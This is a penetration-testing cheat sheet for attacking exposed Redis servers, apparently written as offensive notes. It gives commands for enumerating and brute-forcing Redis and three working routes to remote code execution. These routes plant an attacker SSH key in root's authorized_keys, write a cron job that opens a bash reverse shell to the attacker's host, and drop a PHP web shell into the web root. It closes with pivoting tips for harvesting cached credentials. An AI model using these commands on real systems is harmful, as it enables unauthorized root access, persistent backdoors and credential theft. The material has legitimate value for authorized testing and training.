# 6379 - Redis

## Service Usage

Connect
```bash
redis-cli -h $ip
```

## 0. Fast Path (try these first)

Test unauthenticated access (Redis ships with no auth by default):
```bash
redis-cli -h $ip ping          # PONG = no auth needed
redis-cli -h $ip info
```

## 1. Banner Grab & Unauthenticated Enumeration

nmap
```bash
nmap -p 6379 -sV -sC $ip
nmap -p 6379 --script redis-info $ip
```

Manual
```bash
redis-cli -h $ip INFO
redis-cli -h $ip CONFIG GET *
```

## 2. Authenticated Enumeration

If auth is required (single `requirepass` password, or ACL users on Redis 6+):
```bash
redis-cli -h $ip -a $pw info
redis-cli -h $ip -a $pw CONFIG GET requirepass
```

Dump keys
```bash
redis-cli -h $ip KEYS '*'
```

## 3. Password Spraying / Bruteforcing

*Redis auth is a single password, not per-user. Try defaults first (`foobared` is the shipped example).*
```bash
redis-cli -h $ip -a foobared ping   # test default
hydra -P pass.txt $ip redis
nxc redis $ip -p 6379 --pass-file pass.txt
```

## 5. Quick Wins

### 5.1 No auth → RCE via modifying config (write SSH key or cron)
```bash
# Write SSH key (if we know a valid user + their home)
ssh-keygen -t rsa -f mykey -N ''
echo -e "\n\n$(cat mykey.pub)\n\n" > payload
redis-cli -h $ip set dump "$(cat payload)"
redis-cli -h $ip config set dir /root/.ssh/
redis-cli -h $ip config set dbfilename authorized_keys
redis-cli -h $ip save
ssh -i mykey root@$ip
```

### 5.2 RCE via cron (root Redis on Linux)
```bash
redis-cli -h $ip set cron '*/1 * * * * bash -i >& /dev/tcp/$myip/4444 0>&1'
redis-cli -h $ip config set dir /var/spool/cron/
redis-cli -h $ip config set dbfilename root
redis-cli -h $ip save
```

### 5.3 RCE via web shell (if a web root is reachable)
```bash
redis-cli -h $ip set shell '<?php system($_GET["cmd"]); ?>'
redis-cli -h $ip config set dir /var/www/html/
redis-cli -h $ip config set dbfilename shell.php
redis-cli -h $ip save
curl -s "http://$ip/shell.php?cmd=id"
```

## 6. Config Paths

```text
/etc/redis/redis.conf
```

Config quick-reference:
```text
requirepass -> auth password
bind 127.0.0.1 -> if only localhost, it's not exposed... unless you're on the box
```

## 7. Post-Exploit / Pivot

- Redis RCE → root (if Redis runs as root)
- Dump keys → find cached creds/session data

### Common gotchas
```text
- Default config = no auth, but often binds to localhost only. If port shows open externally, you're likely in.
- If `bind 127.0.0.1` but you're on the box, localhost Redis is still a privesc vector.
- CONFIG SET requires the Redis process to have write perms to the target dir.
- Redis 6+ may need a username (AUTH default $pw) if ACL is configured — default user is "default".
- `foobared` is the example password left in many default configs.
```